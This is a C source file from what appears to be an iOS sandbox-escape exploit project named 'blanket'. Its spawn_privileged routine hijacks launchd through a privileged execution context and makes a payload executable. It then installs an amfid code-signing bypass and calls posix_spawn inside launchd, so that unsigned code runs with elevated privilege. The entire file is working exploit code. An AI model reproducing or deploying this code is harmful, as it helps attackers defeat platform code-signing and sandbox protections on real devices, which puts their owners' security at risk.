#include "blanket/sandbox_escape/spawn_privileged.h"

#include "blanket/amfid/amfid_codesign_bypass.h"
#include "blanket/log/log.h"
#include "blanket/sandbox_escape/threadexec_routines.h"

#include <spawn.h>
#include <sys/stat.h>

// Call chmod() on the payload so that it is executable.
static bool
make_payload_executable(threadexec_t priv_tx, const char *path) {
	int err;
	bool ok = threadexec_call_cv(priv_tx, &err, sizeof(err),
			chmod, 2,
			TX_CARG_CSTRING(const char *, path),
			TX_CARG_LITERAL(mode_t, 0755));
	if (!ok || err != 0) {
		ERROR("Could not make %s executable", path);
		return false;
	}
	return true;
}

// Build the argv and envp arrays in launchd.
static bool
build_argv_in_launchd(threadexec_t launchd_tx, const char *path,
		const char **argv, const char **envp,
		const void **path_r, const void **argv_r, const void **envp_r) {
	// We will lay out the path/argv/envp entries like this:
	//
	// +------+------+------+---------+-----+---------+---------+-----+---------+
	// | argv | envp | path | argv[0] | ... | argv[n] | envp[0] | ... | envp[m] |
	// +------+------+------+---------+-----+---------+---------+-----+---------+
	//
	// First calculate the size of the payload.
	size_t size = 0;
	size_t argv_count, envp_count;
	size_t path_size, argv_size, envp_size;
	path_size = strlen(path) + 1;
	size += path_size;
	for (argv_count = 0; argv[argv_count] != NULL; argv_count++) {
		size += strlen(argv[argv_count]) + 1;
	}
	argv_size = (argv_count + 1) * sizeof(const char *);
	size += argv_size;
	for (envp_count = 0; envp[envp_count] != NULL; envp_count++) {
		size += strlen(envp[envp_count]) + 1;
	}
	envp_size = (envp_count + 1) * sizeof(const char *);
	size += envp_size;
	// Check that this size is reasonable.
	if (size > 0x7000) {
		ERROR("Arguments and environment too large");
		return false;
	}
	// Get the default shared vm region.
	uint8_t *memory_R;
	uint8_t *memory_L;
	threadexec_shared_vm_default(launchd_tx,
			(const void **)&memory_R, (void **)&memory_L, NULL);
	// Create pointers to argv, envp, path, and the strings array.
	char **argv_L    = (void *)(memory_L);
	uint8_t *argv_R  = memory_R;
	char **envp_L    = (void *)((uint8_t *)argv_L + argv_size);
	uint8_t *envp_R  = argv_R + argv_size;
	char *path_L     = (void *)((uint8_t *)envp_L + envp_size);
	uint8_t *path_R  = envp_R + envp_size;
	char *strings_L  = (void *)((uint8_t *)path_L + path_size);
	char *strings_R  = (void *)(path_R + path_size);
	// Fill in the path.
	memcpy(path_L, path, path_size);
	// Fill in the argv array and its strings.
	for (size_t i = 0; i < argv_count; i++) {
		argv_L[i] = strings_R;
		size_t arg_size = strlen(argv[i]) + 1;
		memcpy(strings_L, argv[i], arg_size);
		strings_L += arg_size;
		strings_R += arg_size;
	}
	// Fill in the envp array and its strings.
	for (size_t i = 0; i < envp_count; i++) {
		envp_L[i] = strings_R;
		size_t arg_size = strlen(envp[i]) + 1;
		memcpy(strings_L, envp[i], arg_size);
		strings_L += arg_size;
		strings_R += arg_size;
	}
	// That's it!
	*path_r = path_R;
	*argv_r = argv_R;
	*envp_r = envp_R;
	return true;
}

bool
spawn_privileged(threadexec_t priv_tx, const char *path,
		const char **argv, const char **envp,
		const int *stdio_fds, pid_t *pid) {
	bool success = false;
	// Chmod the payload so it is executable.
	bool ok = make_payload_executable(priv_tx, path);
	if (!ok) {
		goto fail_0;
	}
	// Create an execution context in launchd. We need launchd to be the parent process or the
	// child will get killed.
	threadexec_t launchd_tx = threadexec_init_with_threadexec_and_pid(priv_tx, 1);
	if (launchd_tx == NULL) {
		ERROR("Could not create execution context in launchd");
		goto fail_0;
	}
	// Use default argv and envp arrays if none are specified.
	const char *default_argv[] = { path, NULL };
	const char *default_envp[] = { NULL };
	if (argv == NULL) {
		argv = default_argv;
	}
	if (envp == NULL) {
		envp = default_envp;
	}
	// Build the argv and envp array in launchd. This uses the default shared memory so there's
	// no need to clean up after.
	const void *path_r;
	const void *argv_r;
	const void *envp_r;
	ok = build_argv_in_launchd(launchd_tx, path, argv, envp, &path_r, &argv_r, &envp_r);
	if (!ok) {
		goto fail_1;
	}
	// TODO: stdio_fds.
	// Install the codesigning bypass to allow us to run unsigned code.
	ok = amfid_codesign_bypass_install(priv_tx);
	if (!ok) {
		ERROR("Could not install codesigning bypass");
		goto fail_1;
	}
	// Call posix_spawn() in launchd to spawn the payload.
	DEBUG_TRACE(1, "Spawning %s", path);
	pid_t spawned_pid;
	int err;
	ok = threadexec_call_cv(launchd_tx, &err, sizeof(err),
			posix_spawn, 6,
			TX_CARG_PTR_LITERAL_OUT(pid_t *, &spawned_pid),
			TX_CARG_LITERAL(const char *, path_r),
			TX_CARG_LITERAL(void *, NULL),
			TX_CARG_LITERAL(void *, NULL),
			TX_CARG_LITERAL(void *, argv_r),
			TX_CARG_LITERAL(void *, envp_r));
	if (!ok || err != 0) {
		ERROR("Could not spawn %s: error %d", path, err);
		goto fail_2;
	}
	// Success!
	DEBUG_TRACE(1, "Spawned %s as PID %d", path, spawned_pid);
	if (pid != NULL) {
		*pid = spawned_pid;
	}
	success = true;
fail_2:
	amfid_codesign_bypass_remove();
fail_1:
	threadexec_deinit(launchd_tx);
fail_0:
	return success;
}
